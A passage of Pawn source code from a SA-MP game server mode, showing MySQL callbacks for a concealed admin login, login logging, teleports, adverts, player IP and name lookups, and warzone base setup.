    if (rows)
    {
		GetPlayerName(playerid, playername, sizeof(playername));
		format(strings, sizeof(strings), "%s (id: %d) has been banned from the server. (Reason: Blacklisted)", playername, playerid);
		SendServerMessageToAll(EMBED_RED, strings);
		printflog("ADM-MSG", strings);
		format(ircstring, sizeof(ircstring), "4,1%s", strings);
		IRC_GroupSay(1, IRC_CHANNEL, ircstring);
		BanEx(playerid, strings);
    }
    return 1;
}

forward QS_GhostPlayerAccount(playerid, ccinc, password[]);
public QS_GhostPlayerAccount(playerid, ccinc, password[])
{
	querybalance--;
	checkcinc();

    new rows, fields;

    cache_get_data(rows, fields);
    if (rows) // player account exists
    {
        /*
		(0)	account_id      	int(11)
		(1)	account_name        varchar(24)
		(2)	account_password    varchar(129)
		(3)	account_vip         tinyint(1)
		(4)	account_admin       tinyint(1)
		*/

        new strValue[11],
			GhostAccountID;
        cache_get_row(0, 0, strValue);  GhostAccountID = strval(strValue);

		new mysqlStr[350];
	    format(mysqlStr, sizeof(mysqlStr), "SELECT * FROM accounts, player_logs, preferences WHERE accounts.account_id = %d AND accounts.account_password = '%s' AND player_logs.account_id = %d AND preferences.account_id = %d LIMIT 1", GhostAccountID, password, GhostAccountID, GhostAccountID);
		mysql_run_query(mysqlConnection, mysqlStr, true, "QS_ManualGhostPlayerLogin", "iii", playerid, player[playerid][cinc], GhostAccountID);
	} else SendErrorMessage(playerid, EMBED_WHITE, "You have tried a non-existing command, type /help to view a complete list of server commands.");
	return 1;
}

forward QS_ManualGhostPlayerLogin(playerid, ccinc, account_id);
public QS_ManualGhostPlayerLogin(playerid, ccinc, account_id)
{
	querybalance--;
	checkcinc();

    new rows, fields,
		mysqlStr[683];

    cache_get_data(rows, fields);
    if (rows) // allow login because player matches last used name and password		|OR|    player matches ghost account and password
    {
        /*
		(0)		account_id      				int(11)
		(1)		account_name        			varchar(24)
		(2)		account_password    			varchar(129)
		(3)		account_vip         			tinyint(1)
		(4)		account_admin       			tinyint(1)

		(5)     account_id          			int(11)
		(6)		player_log_login_success_count 	int(11)
		(7)		player_log_login_fail_count		int(11)
		(8)		player_log_last_login_date_1   	date
		(9)		player_log_last_login_date_2   	date
		(10)	player_log_last_login_date_3   	date
		(11)	player_log_last_login_date_4   	date
		(12)	player_log_last_login_date_5   	date
		(13)	player_log_last_login_time_1   	time
		(14)	player_log_last_login_time_2   	time
		(15)	player_log_last_login_time_3   	time
		(16)	player_log_last_login_time_4   	time
		(17)	player_log_last_login_time_5   	time
		(18)	player_log_last_logout_date_1  	date
		(19)	player_log_last_logout_date_2  	date
		(20)	player_log_last_logout_date_3  	date
		(21)	player_log_last_logout_date_4  	date
		(22)	player_log_last_logout_date_5  	date
		(23)	player_log_last_logout_time_1  	time
		(24)	player_log_last_logout_time_2  	time
		(25)	player_log_last_logout_time_3  	time
		(26)	player_log_last_logout_time_4  	time
		(27)	player_log_last_logout_time_5  	time
		(28)	player_log_last_connect_date  	date
		(29)	player_log_last_connect_time  	time
		(30)	player_log_register_date      	date
		(31)	player_log_register_time      	time
		(32)	player_log_total_playtime       int(11)
		(33)	player_log_kick_count         	int(11)
		(34)	player_log_ban_count          	int(11)
		(35)	player_log_warn_count         	int(11)
		(36)	player_log_connect_count      	int(11)
		(37)	player_log_register_ip        	varchar(16)
		(38)	player_log_connect_ip         	varchar(16)
		(39)	player_log_login_ip				varchar16)

		(40)    account_id						int(11)
		(41)	preference_hide       	 		tinyint(1)
		(42)	preference_god        			tinyint(1)
		(43)	preference_vgod       			tinyint(1)
		(44)	preference_greeting				varchar(100)
		(45)	preference_location    			float
		*/

		player[playerid][logintimeout]	= -1;
		player[playerid][logged]		= 1;
		player[playerid][clogged]		= 1;
		player[playerid][accountid]		= account_id;

  		new strValue[24],
		  	playerrank[35] = "?";

        cache_get_row(0, 3, strValue);	player[playerid][VIP] = strval(strValue);
        cache_get_row(0, 4, strValue);	player[playerid][ADMIN] = strval(strValue);
        //cache_get_row(0, 41, strValue);	player[playerid][hideadmin] = strval(strValue);
        player[playerid][hideadmin] = 1;
        cache_get_row(0, 42, strValue);	if (servergodmode) player[playerid][godmode] = strval(strValue);
        cache_get_row(0, 43, strValue);	if (servergodmode) player[playerid][vgodmode] = strval(strValue);
        cache_get_row(0, 1, strValue);

		player[playerid][muted] = 0;

		GetPlayerName(playerid, playername, sizeof(playername));
		switch(player[playerid][ADMIN])
		{
		    case 0: // only admins can use clogin
		    {
				SendErrorMessage(playerid, EMBED_WHITE, "You have tried a non-existing command, type /help to view a complete list of server commands.");
				return 1;
		    }
		    case 1,2:
		    {
				player[playerid][adminmsgs] = 1;
				format(playerrank, sizeof(playerrank), "Server Moderator (Level %d)", player[playerid][ADMIN]);
		    }
		    case 3:
		    {
		    	player[playerid][adminmsgs] = 1;
				format(playerrank, sizeof(playerrank), "Server Operator (Level %d)", player[playerid][ADMIN]);
		    }
		    case 4:
		    {
		    	player[playerid][adminmsgs] = 1;
				format(playerrank, sizeof(playerrank), "Server Administrator (Level %d)", player[playerid][ADMIN]);
		    }
			case 5,6:
		    {
		    	player[playerid][adminmsgs] = 1;
				format(playerrank, sizeof(playerrank), "Super Sexy Admin (Level %d)", player[playerid][ADMIN]);
		    }
		}
		format(logstring, sizeof(logstring), "Welcome back %s, you have succesfully logged in as a %s.", playername, playerrank);
		SendServerMessage(playerid, EMBED_WHITE, logstring);
		GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~g~~h~~h~SUCCESS", 2000, 3);
		format(logstring, sizeof(logstring), "[A-%d]: "EMBED_BROWN"%s (id: %d) has succesfully logged in as \"%s\" %s.", player[playerid][ADMIN], playername, playerid, strValue, playerrank);
		for (new a = 0; a < MAX_PLAYERS; a++)
		{
		    if (IsPlayerConnected(a) && player[a][ADMIN] >= player[playerid][ADMIN] && player[a][adminmsgs] == 1)
		    {
		        if (a == playerid)
		        continue;

				SendClientMessage(a, COLOR_RED, logstring);
			}
		}
		format(logstring, sizeof(logstring), "[A-%d]: %s (id: %d) has succesfully logged in as \"%s\" %s.", player[playerid][ADMIN], playername, playerid, strValue, playerrank);
		printflog("LOGIN-A", logstring);
		format(ircstring, sizeof(ircstring), "12%s", logstring);
		IRC_GroupSay(1, IRCOP_CHANNEL, ircstring);

		/*if (player[playerid][ADMIN] != 0 && player[playerid][hideadmin] == 1)
		SendServerMessage(playerid, EMBED_ORANGE, "You are automatically hidden from the admin list.");*/

		new log_last_date[5][11],
		    log_last_time[5][9],
			log_ip[16];

		getdate(year, month, day);
		gettime(hour, minute, second);
		format(log_last_date[0], 11, "%d-%02d-%02d", year, month, day);
		format(log_last_time[0], 9, "%02d:%02d:%02d", hour, minute, second);
		GetPlayerIp(playerid, log_ip, sizeof(log_ip));

		for (new sessions = 0; sessions < 4; sessions++) // only need first 4
		{
			cache_get_row(0, sessions+8, log_last_date[sessions+1]);	// date
			cache_get_row(0, sessions+13, log_last_time[sessions+1]);	// time
		}

	    format(mysqlStr, sizeof(mysqlStr), "UPDATE "MYSQL_TABLE_PLAYER_LOGS" SET `player_log_login_success_count` = player_log_login_success_count +1, `player_log_last_login_date_1` = '%s', `player_log_last_login_date_2` = '%s', `player_log_last_login_date_3` = '%s', `player_log_last_login_date_4` = '%s', `player_log_last_login_date_5` = '%s', ", log_last_date[0], log_last_date[1], log_last_date[2], log_last_date[3], log_last_date[4]);
		format(mysqlStr, sizeof(mysqlStr), "%s`player_log_last_login_time_1` = '%s', `player_log_last_login_time_2` = '%s', `player_log_last_login_time_3` = '%s', `player_log_last_login_time_4` = '%s', `player_log_last_login_time_5` = '%s', `player_log_login_ip` = '%s' WHERE `account_id` = %d LIMIT 1", mysqlStr, log_last_time[0], log_last_time[1], log_last_time[2], log_last_time[3], log_last_time[4], log_ip, player[playerid][accountid]);
  		mysql_run_query(mysqlConnection, mysqlStr, false, "", "");

		CheckAccountBan(playerid);
	} else { // player does not match password
	  	player[playerid][loginfail] += 1;

        GetPlayerName(playerid, playername, sizeof(playername));
		format(logstring, sizeof(logstring), "Login attempt by %s (id: %d) - incorrect password.", playername, playerid);
		SendServerMessageToAdmins(EMBED_BROWN, logstring, 1);
		printflog("LOGIN-F", logstring);

		format(ircstring, sizeof(ircstring), "4%s", logstring);
		IRC_GroupSay(1, IRCOP_CHANNEL, ircstring);

		SendErrorMessage(playerid, EMBED_WHITE, "You have tried a non-existing command, type /help to view a complete list of server commands.");

		format(mysqlStr, sizeof(mysqlStr), "UPDATE "MYSQL_TABLE_PLAYER_LOGS" SET `player_log_login_fail_count` = player_log_login_fail_count +1 WHERE `account_id` = %d LIMIT 1", player[playerid][accountid]);
		mysql_run_query(mysqlConnection, mysqlStr, false, "", "");
	}
	return 1;
}

forward QS_LoadPlayerTeleport(playerid, ccinc);
public QS_LoadPlayerTeleport(playerid, ccinc)
{
	querybalance--;
	checkcinc();

    new rows, fields;

    cache_get_data(rows, fields);
    if (rows)
    {
        /*
		(0) teleport_id     		int(11)
		(1) teleport_x      		float
		(2) teleport_y      		float
		(3) teleport_z      		float
		(4) teleport_angle  		float
		(5) teleport_interior   	tinyint(4)
		(6) teleport_description    varchar(50)
		(7) admin_id                int(11)
		*/

        new strValue[50],
	        pTeleID,
	        Float:pX,
		  	Float:pY,
		  	Float:pZ,
	  		Float:pA,
		  	pI;
		cache_get_row(0, 0, strValue);	pTeleID = strval(strValue);
        cache_get_row(0, 1, strValue);	pX = floatstr(strValue);
        cache_get_row(0, 2, strValue);	pY = floatstr(strValue);
        cache_get_row(0, 3, strValue);	pZ = floatstr(strValue);
        cache_get_row(0, 4, strValue);	pA = floatstr(strValue);
        cache_get_row(0, 5, strValue);	pI = strval(strValue);
        cache_get_row(0, 6, strValue);

		SetPlayerPosEx(playerid, pX, pY, pZ, pA, pI);

		format(strings, sizeof(strings), "You have teleported to \"%s\" (ID: %d).", strValue, pTeleID);
		SendServerMessage(playerid, EMBED_WHITE, strings);
	} else SendErrorMessage(playerid, EMBED_RED, "There is no teleport saved in this slot.");
	return 1;
}

forward QS_LoadPlayerTeleportList(playerid, ccinc);
public QS_LoadPlayerTeleportList(playerid, ccinc)
{
	querybalance--;
	checkcinc();

    new rows, fields;

    cache_get_data(rows, fields);
    if (rows)
    {
        /*
		(0) teleport_id     		int(11)
		(1) teleport_x      		float
		(2) teleport_y      		float
		(3) teleport_z      		float
		(4) teleport_angle  		float
		(5) teleport_interior   	tinyint(4)
		(6) teleport_description    varchar(50)
		(7) admin_id                int(11)
		*/

        new strValue[50],
	        pTeleID,
			strTeleportList[1000] = ""EMBED_LIME"ID\tDescription\n";

	    for (new pTeleports = 0; pTeleports < rows; pTeleports++)
		{
			cache_get_row(pTeleports, 0, strValue);	pTeleID = strval(strValue);
	        cache_get_row(pTeleports, 6, strValue);

			if (strlen(strValue) > 25)
			{
				strmid(strValue, strValue, 0, 22);
				strcat(strValue, "...");
			}

			format(strValue, sizeof(strValue), "%d\t%s\n", pTeleID, strValue);
			strcat(strTeleportList, strValue);
	    }
		ShowPlayerDialog(playerid, DIALOGID_TELEPORTS, DIALOG_STYLE_LIST, "Teleports", strTeleportList, "Teleport", "Close");
	} else SendErrorMessage(playerid, EMBED_RED, "There are no teleports saved.");
	return 1;
}

forward QS_LoadAdsList(playerid, ccinc);
public QS_LoadAdsList(playerid, ccinc)
{
	querybalance--;
	checkcinc();

    new rows, fields;

    cache_get_data(rows, fields);
    if (rows)
    {
        /*
		(0) advert_id     	int(11)
		(1) advert_message  varchar(115)
		*/

        new strValue[120],
	        adID;

	    for (new Ads = 0; Ads < rows; Ads++)
		{
			cache_get_row(Ads, 0, strValue);	adID = strval(strValue);
	        cache_get_row(Ads, 1, strValue);

	        format(strValue, sizeof(strValue), "%d %s", adID, strValue);
			SendClientMessage(playerid, COLOR_LIGHTNAVY, ColouredText(strValue));
	    }
	} else SendErrorMessage(playerid, EMBED_RED, "There were no ads found in the database.");
	return 1;
}

forward QS_CreateAdd(playerid, ccinc, advertid, advertmsg[]);
public QS_CreateAdd(playerid, ccinc, advertid, advertmsg[])
{
	querybalance--;
	checkcinc();

    new rows, fields;

    cache_get_data(rows, fields);
    if (rows)
    {
		SendErrorMessage(playerid, EMBED_RED , "An ad with this ID already exists.");
	} else {
		new mysqlStr[204];
		
		mysql_real_escape_string(advertmsg, advertmsg);
	 	format(mysqlStr, sizeof(mysqlStr), "INSERT INTO "MYSQL_TABLE_ADVERTS" (advert_id, advert_message) VALUES(%d, '%s')", advertid, advertmsg);
		mysql_run_query(mysqlConnection, mysqlStr, false, "", "");

		SendServerMessage(playerid, EMBED_WHITE, "Your ad was added to the database.");
		SendCommandMessageToAdmins(playerid, "advert");
	}
	return 1;
}

forward QS_RemoveAdd(playerid, ccinc, advertid);
public QS_RemoveAdd(playerid, ccinc, advertid)
{
	querybalance--;
	checkcinc();

    new rows, fields;

    cache_get_data(rows, fields);
    if (rows)
    {
    	new mysqlStr[73];
	 	format(mysqlStr, sizeof(mysqlStr), "DELETE FROM "MYSQL_TABLE_ADVERTS" WHERE advert_id = %d LIMIT 1", advertid);
		mysql_run_query(mysqlConnection, mysqlStr, false, "", "");

		SendServerMessage(playerid, EMBED_WHITE, "The ad was removed from the database.");
		SendCommandMessageToAdmins(playerid, "advert");
	} else {
		SendErrorMessage(playerid, EMBED_RED , "There was no ad found with that ID in the database.");
	}
	return 1;
}

forward QS_CheckPlayerInfo(playerid, ccinc);
public QS_CheckPlayerInfo(playerid, ccinc)
{
	querybalance--;
	checkcinc();

    new rows, fields;

    cache_get_data(rows, fields);
    if (rows)
    {
        /*
		(0) ip_id           int(11)
		(1) ip_name         varchar(24)
		(2) ip_connect_ip   varchar(16)
		(3) ip_connect_host varchar(75)
		(4) ip_connect_date date
		*/

        new matches = 0,
            ipStr[154],
			ip_name[24],
			ip_connect_ip[16],
			ip_connect_host[60],
			ip_connect_date[11],
			ip_country[35] = "Unknown";

	    for (new infoMatches = 0; infoMatches < rows; infoMatches++)
		{
			if (matches < 11) // only show first 10
			{
		        cache_get_row(infoMatches, 1, ip_name);
		        cache_get_row(infoMatches, 2, ip_connect_ip);
		        cache_get_row(infoMatches, 3, ip_connect_host);
		        cache_get_row(infoMatches, 4, ip_connect_date);

		    	GetCountryName(ip_connect_ip, ip_country);

				format(ipStr, sizeof(ipStr), "%s's IP: %s | HOST: %s | Last seen: %s | Location: %s", ip_name, ip_connect_ip, ip_connect_host, ip_connect_date, ip_country);
				SendClientMessage(playerid, COLOR_LIGHTNAVY, ipStr);
			}
			matches++;
        }
		format(ipStr, sizeof(ipStr), "%d match(es) found.", matches);
		SendClientMessage(playerid, COLOR_LIGHTNAVY, ipStr);
	} else SendErrorMessage(playerid, EMBED_RED, "There was no user with that NAME found in the database.");
	return 1;
}

forward QS_CheckPlayerIpMatch(playerid, ccinc, ip[]);
public QS_CheckPlayerIpMatch(playerid, ccinc, ip[])
{
	querybalance--;
	checkcinc();

    new rows, fields;

    cache_get_data(rows, fields);
    if (rows)
    {
        /*
		(0) ip_id           int(11)
		(1) ip_name         varchar(24)
		(2) ip_connect_ip   varchar(16)
		(3) ip_connect_host varchar(75)
		(4) ip_connect_date date
		*/

        new ipmatchStr[132],
			ip_name[24];

		format(ipmatchStr, sizeof(ipmatchStr), "[IPmatch \"%s\"]", ip);
	    for (new ipMatches = 0; ipMatches < rows; ipMatches++)
		{
  			cache_get_row(ipMatches, 1, ip_name);
			if (strlen(ipmatchStr) <= 100)
			{
				format(ipmatchStr, sizeof(ipmatchStr), "%s %s", ipmatchStr, ip_name);
			} else {
				SendClientMessage(playerid, COLOR_LIGHTNAVY, ipmatchStr);
				format(ipmatchStr, sizeof(ipmatchStr), "%s", ip_name);
			}
        }
		if (strlen(ipmatchStr) <= 100)
		SendClientMessage(playerid, COLOR_LIGHTNAVY, ipmatchStr);
	} else SendErrorMessage(playerid, EMBED_RED, "There was no matching IP found in the database.");
	return 1;
}

forward QS_CheckPlayerHostMatch(playerid, ccinc);
public QS_CheckPlayerHostMatch(playerid, ccinc)
{
	querybalance--;
	checkcinc();

    new rows, fields;

    cache_get_data(rows, fields);
    if (rows)
    {
        /*
		(0) ip_id           int(11)
		(1) ip_name         varchar(24)
		(2) ip_connect_ip   varchar(16)
		(3) ip_connect_host varchar(75)
		(4) ip_connect_date date
		*/

        new matches = 0,
            hostmatchStr[154],
			ip_name[24],
			ip_connect_ip[16],
			ip_connect_host[60],
			ip_connect_date[11],
			ip_country[35] = "Unknown";

	    for (new infoMatches = 0; infoMatches < rows; infoMatches++)
		{
			if (matches < 11) // only show first 10
			{
		        cache_get_row(infoMatches, 1, ip_name);
		        cache_get_row(infoMatches, 2, ip_connect_ip);
		        cache_get_row(infoMatches, 3, ip_connect_host);
		        cache_get_row(infoMatches, 4, ip_connect_date);

		    	GetCountryName(ip_connect_ip, ip_country);

				format(hostmatchStr, sizeof(hostmatchStr), "%s's IP: %s | HOST: %s | Last seen: %s | Location: %s", ip_name, ip_connect_ip, ip_connect_host, ip_connect_date, ip_country);
				SendClientMessage(playerid, COLOR_LIGHTNAVY, hostmatchStr);
			}
			matches++;
        }
		format(hostmatchStr, sizeof(hostmatchStr), "%d match(es) found.", matches);
		SendClientMessage(playerid, COLOR_LIGHTNAVY, hostmatchStr);
	} else SendErrorMessage(playerid, EMBED_RED, "There was no user with that HOST found in the database.");
	return 1;
}

forward QS_CheckPlayerNameMatch(playerid, ccinc, name[]);
public QS_CheckPlayerNameMatch(playerid, ccinc, name[])
{
	querybalance--;
	checkcinc();

    new rows, fields;

    cache_get_data(rows, fields);
    if (rows)
    {
        /*
		(0) ip_id           int(11)
		(1) ip_name         varchar(24)
		(2) ip_connect_ip   varchar(16)
		(3) ip_connect_host varchar(75)
		(4) ip_connect_date date
		*/

        new namematchStr[132],
			ip_name[24];

		format(namematchStr, sizeof(namematchStr), "[NAMEmatch \"%s\"]", name);
	    for (new nameMatches = 0; nameMatches < rows; nameMatches++)
		{
  			cache_get_row(nameMatches, 1, ip_name);
			if (strlen(namematchStr) <= 100)
			{
				format(namematchStr, sizeof(namematchStr), "%s %s", namematchStr, ip_name);
			} else {
				SendClientMessage(playerid, COLOR_LIGHTNAVY, namematchStr);
				format(namematchStr, sizeof(namematchStr), "%s", ip_name);
			}
        }
		if (strlen(namematchStr) <= 100)
		SendClientMessage(playerid, COLOR_LIGHTNAVY, namematchStr);
	} else SendErrorMessage(playerid, EMBED_RED, "There was no matching NAME found in the database.");
	return 1;
}


forward QS_CreateTeleport(playerid, ccinc, TeleID, TeleDesc[]);
public QS_CreateTeleport(playerid, ccinc, TeleID, TeleDesc[])
{
	querybalance--;
	checkcinc();

    new rows, fields;

    cache_get_data(rows, fields);
    if (rows)
    {
		SendErrorMessage(playerid, EMBED_RED , "A teleport with this ID already exists in the database.");
	} else {
	  	new vID = GetPlayerVehicleID(playerid),
		  	playerint = GetPlayerInterior(playerid);

		if (vID)
		{
			GetVehiclePos(vID, playerxyza[0], playerxyza[1], playerxyza[2]);
		    GetVehicleZAngle(vID, playerxyza[3]);
		} else {
	 		GetPlayerPos(playerid, playerxyza[0], playerxyza[1], playerxyza[2]);
		    GetPlayerFacingAngle(playerid, playerxyza[3]);
		}

		new mysqlStr[300];
		
		mysql_real_escape_string(TeleDesc, TeleDesc);
	 	format(mysqlStr, sizeof(mysqlStr), "INSERT INTO "MYSQL_TABLE_TELEPORTS" (teleport_id, teleport_x, teleport_y, teleport_z, teleport_angle, teleport_interior, teleport_description, admin_id) VALUES(%d, %f, %f, %f, %f, %d, '%s', %d)", TeleID, playerxyza[0], playerxyza[1], playerxyza[2], playerxyza[3], playerint, TeleDesc, GetPlayerAccountID(playerid));
		mysql_run_query(mysqlConnection, mysqlStr, false, "", "");

    	GetPlayerName(playerid, playername, sizeof(playername));
		format(strings, sizeof(strings), "Admin %s has added a new teleport \"%s\" - /ptele %d.", playername, TeleDesc, TeleID);
		SendServerMessageToAll(EMBED_WHITE, strings);
		SendCommandMessageToAdmins(playerid, "addtele");
	}
	return 1;
}

forward QS_RemoveTeleport(playerid, ccinc, TeleID);
public QS_RemoveTeleport(playerid, ccinc, TeleID)
{
	querybalance--;
	checkcinc();

    new rows, fields;

    cache_get_data(rows, fields);
    if (rows)
    {
        /*
		(0) teleport_id     		int(11)
		(1) teleport_x      		float
		(2) teleport_y      		float
		(3) teleport_z      		float
		(4) teleport_angle  		float
		(5) teleport_interior   	tinyint(4)
		(6) teleport_description    varchar(50)
		(7) admin_id                int(11)
		*/

        new strValue[50],
			mysqlStr[79];
        cache_get_row(0, 6, strValue);

	 	format(mysqlStr, sizeof(mysqlStr), "DELETE FROM "MYSQL_TABLE_TELEPORTS" WHERE `teleport_id` = %d LIMIT 1", TeleID);
		mysql_run_query(mysqlConnection, mysqlStr, false, "", "");

		GetPlayerName(playerid, playername, sizeof(playername));
		format(strings, sizeof(strings), "Admin %s has removed teleport %d - \"%s\".", playername, TeleID, strValue);
		SendServerMessageToAll(EMBED_WHITE, strings);
		SendCommandMessageToAdmins(playerid, "deltele");
	} else SendErrorMessage(playerid, EMBED_RED , "There is no teleport with this ID found in the database.");
	return 1;
}

forward QS_LoadWarzoneBasesList(playerid, ccinc, dialogid);
public QS_LoadWarzoneBasesList(playerid, ccinc, dialogid)
{
	querybalance--;
	checkcinc();

    new rows, fields;

    cache_get_data(rows, fields);
    if (rows)
    {
        /*
        (0) warzone_base_id              int(11)
        (1) warzone_base_name            varchar(50)
        (2) warzone_base_attacker_x      float
        (3) warzone_base_attacker_y      float
        (4) warzone_base_attacker_z      float
        (5) warzone_base_attacker_angle  float
        (6) warzone_base_defender_x      float
        (7) warzone_base_defender_y      float
        (8) warzone_base_defender_z      float
        (9) warzone_base_defender_angle  float
        (10) warzone_base_checkpoint_x    float
        (11) warzone_base_checkpoint_y    float
        (12) warzone_base_checkpoint_z    float
        (13) warzone_base_checkpoint_size float
        (14) warzone_base_base_mode       tinyint(1)
		*/

        new strValue[50],
	        pBaseID,
			strBasesList[1000] = ""EMBED_LIME"ID\tDescription\n";

	    for (new pBases = 0; pBases < rows; pBases++)
		{
			cache_get_row(pBases, 0, strValue);	pBaseID = strval(strValue);
	        cache_get_row(pBases, 1, strValue);

			if (strlen(strValue) > 25)
			{
				strmid(strValue, strValue, 0, 22);
				strcat(strValue, "...");
			}

			format(strValue, sizeof(strValue), "%d\t%s\n", pBaseID, strValue);
			strcat(strBasesList, strValue);
	    }
		ShowPlayerDialog(playerid, dialogid, DIALOG_STYLE_LIST, "Warzone Bases", strBasesList, "OK", "");
	} else SendErrorMessage(playerid, EMBED_RED, "There are no warzone bases saved.");
	return 1;
}

forward QS_LoadWarzoneSettings();
public QS_LoadWarzoneSettings()
{
	querybalance--;

    new rows, fields;

    cache_get_data(rows, fields);
    if (rows)
    {
        /*
		(0) warzone_setting_id					int(11)
		(1) warzone_setting_skin_attackers		tinyint(4)
		(2) warzone_setting_skin_defenders		tinyint(4)
		(3) warzone_setting_colour_attackers_r	tinyint(4)
		(4) warzone_setting_colour_attackers_g	tinyint(4)
		(5) warzone_setting_colour_attackers_b	tinyint(4)
		(6) warzone_setting_colour_attackers_a	tinyint(4)
		(7) warzone_setting_colour_defenders_r	tinyint(4)
		(8) warzone_setting_colour_defenders_g	tinyint(4)
		(9) warzone_setting_colour_defenders_b	tinyint(4)
		(10) warzone_setting_colour_defenders_a	tinyint(4)
		*/

        new strValue[4],
			R, G, B,
			mysqlStr[81];
        cache_get_row(0, 1, strValue);  warzoneskinattackers = strval(strValue);
        cache_get_row(0, 2, strValue);  warzoneskindefenders = strval(strValue);
        cache_get_row(0, 3, strValue);  R = strval(strValue);
        cache_get_row(0, 4, strValue);  G = strval(strValue);
        cache_get_row(0, 5, strValue);  B = strval(strValue);
        warzonecolourattackers = MAKE_COLOUR_ALPHA(R, G, B, 50);

        cache_get_row(0, 7, strValue);  R = strval(strValue);
        cache_get_row(0, 8, strValue);  G = strval(strValue);
        cache_get_row(0, 9, strValue);  B = strval(strValue);
        warzonecolourdefenders = MAKE_COLOUR_ALPHA(R, G, B, 50);

	 	format(mysqlStr, sizeof(mysqlStr), "SELECT * FROM "MYSQL_TABLE_WARZONE_BASES" WHERE `warzone_base_id` = %d", warzonebase);
		mysql_run_query(mysqlConnection, mysqlStr, true, "QS_LoadWarzoneBase", "");
	} else {
		StopWarzone();
		for (new cp = 0; cp < MAX_PLAYERS; cp++)
		{
			if (IsPlayerConnected(cp) && player[cp][playingwarzone] == 1)
			{
				if (servergodmode) player[cp][godmode] = 1;
				SetPlayerColor(cp, PlayerColors[random(sizeof(PlayerColors))]);
				player[cp][playingwarzone] = 0;
				player[cp][playerwarzoneteam] = 0;
				if (player[cp][playerwarzonemode] == 1)
				{
					SpawnPlayer(cp);
					player[cp][playerwarzonemode] = 0;
				} else {
					player[cp][Spectating] = 0;
					player[cp][SpectatingOn] = -1;
				    TogglePlayerSpectating(cp, false);
				}
			 	player[cp][playerwarzoneset] = 0;
				player[cp][moviecrew] = -1;
				SetPlayerTeam(cp, cp);
				SetPlayerArmour(cp, 0.00);
			}
		}
		SendServerMessageToAll(EMBED_PINKRED, "Stopped Warzone. (Could not load Warzone settings)");
		IRC_GroupSay(1, IRC_CHANNEL, "6Stopped Warzone. (Could not load Warzone settings)");
	}
	return 1;
}

forward QS_LoadWarzoneBase();
public QS_LoadWarzoneBase()
{
	querybalance--;

    new rows, fields;

    cache_get_data(rows, fields);
    if (rows)
    {
        /*
        (0) warzone_base_id					int(11)
        (1) warzone_base_name          		varchar(50)
        (2) warzone_base_attacker_x     	float
        (3) warzone_base_attacker_y      	float
        (4) warzone_base_attacker_z      	float
        (5) warzone_base_attacker_angle  	float
        (6) warzone_base_defender_x      	float
        (7) warzone_base_defender_y      	float
        (8) warzone_base_defender_z      	float
        (9) warzone_base_defender_angle  	float
        (10) warzone_base_checkpoint_x    	float
        (11) warzone_base_checkpoint_y    	float
        (12) warzone_base_checkpoint_z    	float
        (13) warzone_base_checkpoint_size 	float
        (14) warzone_base_base_mode			tinyint(1)
        (15) warzone_base_area_min_x	 	float
        (16) warzone_base_area_min_y	 	float
		(17) warzone_base_area_max_x	 	float
        (18) warzone_base_area_max_y		float
		*/

        new strValue[50],
			Float:attX,
			Float:attY,
			Float:attZ,
			Float:attA,
			Float:defX,
			Float:defY,
			Float:defZ,
			Float:defA,
			Float:cpSize,
			Float:gangMinX,
			Float:gangMinY,
			Float:gangMaxX,
			Float:gangMaxY,
			mysqlStr[84];
        cache_get_row(0, 2, strValue);  attX = floatstr(strValue);
        cache_get_row(0, 3, strValue);  attY = floatstr(strValue);
        cache_get_row(0, 4, strValue);  attZ = floatstr(strValue);
        cache_get_row(0, 5, strValue);  attA = floatstr(strValue);
        cache_get_row(0, 6, strValue);  defX = floatstr(strValue);
        cache_get_row(0, 7, strValue);  defY = floatstr(strValue);
        cache_get_row(0, 8, strValue);  defZ = floatstr(strValue);
        cache_get_row(0, 9, strValue);  defA = floatstr(strValue);
        cache_get_row(0, 10, strValue);  warzonecpx = floatstr(strValue);
        cache_get_row(0, 11, strValue);  warzonecpy = floatstr(strValue);
        cache_get_row(0, 12, strValue);  warzonecpz = floatstr(strValue);
        cache_get_row(0, 13, strValue);  cpSize = floatstr(strValue);
        cache_get_row(0, 14, strValue);  warzonemode = strval(strValue);
        cache_get_row(0, 15, strValue);  gangMinX = floatstr(strValue);
        cache_get_row(0, 16, strValue);  gangMinY = floatstr(strValue);
        cache_get_row(0, 17, strValue);  gangMaxX = floatstr(strValue);
        cache_get_row(0, 18, strValue);  gangMaxY = floatstr(strValue);
        cache_get_row(0, 1, strValue);

		warzonegangzone = GangZoneCreate(gangMinX, gangMinY, gangMaxX, gangMaxY);
		if (!warzonemode)
		{
		    for (new wzPlayer; wzPlayer < MAX_PLAYERS; wzPlayer++)
			{
				if (IsPlayerConnected(wzPlayer) && player[wzPlayer][playingwarzone] == 1)
				{
				    TogglePlayerControllable(wzPlayer, 0);
					player[wzPlayer][antifall] 	= 0;
					player[wzPlayer][godmode] 	= 0;
					player[wzPlayer][vgodmode] 	= 0;
				 	player[wzPlayer][running] 	= 0;
				 	player[wzPlayer][walking]	= 0;
				    player[wzPlayer][skating] 	= 0;
				    player[wzPlayer][swimming] 	= 0;
					if (player[wzPlayer][strew] == 1)
					{
						player[wzPlayer][strew] = 0;
						KillTimer(player[wzPlayer][aftimer]);
						DestroyPlayerObject(wzPlayer, player[wzPlayer][strewid]);
						player[wzPlayer][strewid] = -1;
					}

					for (new listplayers = 0; listplayers < MAX_WARZONE_PLAYERS; listplayers++)
					{
					    if (warzoneplayerlist[listplayers] == -1)
					    {
						  	warzoneplayerlist[listplayers] = wzPlayer;
						  	break;
					  	}
					}

				    SetPlayerInterior(wzPlayer, 0);
				    if (player[wzPlayer][playerwarzoneteam] == 0)
				    {
					    if (warzoneattackers > warzonedefenders)
						{
							player[wzPlayer][playerwarzoneteam] = 2;
						 	SetPlayerTeam(wzPlayer, TEAM_DEFENDERS);
							warzonedefenders++;
					    } else {
							player[wzPlayer][playerwarzoneteam] = 1;
						 	SetPlayerTeam(wzPlayer, TEAM_ATTACKERS);
							warzoneattackers++;
						}
				    }
				    
				    if (player[wzPlayer][playerwarzoneset] == 0)
					player[wzPlayer][playerwarzoneset] = random(5)+1;
				    
				    if (player[wzPlayer][playerwarzoneteam] == 1)
				    {
				        SetPlayerSkin(wzPlayer, warzoneskinattackers);
				        SetPlayerPos(wzPlayer, attX + (warzoneattackersleft / 1.5), attY + (warzoneattackersleft / 1.5), attZ);
				        SetPlayerFacingAngle(wzPlayer, attA);
				        SetPlayerColor(wzPlayer, warzonecolourattackers);
				        warzoneattackersleft++;
				    } else {
				        SetPlayerSkin(wzPlayer, warzoneskindefenders);
